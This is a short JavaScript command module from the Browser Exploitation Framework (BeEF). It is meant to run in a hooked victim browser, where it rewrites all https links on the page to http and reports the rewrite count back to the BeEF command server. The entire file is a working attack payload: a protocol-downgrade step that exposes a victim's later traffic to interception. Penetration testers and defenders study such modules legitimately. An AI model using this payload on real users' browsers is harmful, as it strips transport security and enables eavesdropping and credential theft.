//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	selector = "a";
	old_protocol = "https";
	new_protocol = "http";

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+beef.dom.rewriteLinksProtocol(old_protocol, new_protocol, selector)+' '+old_protocol+' links rewritten to '+new_protocol);

});

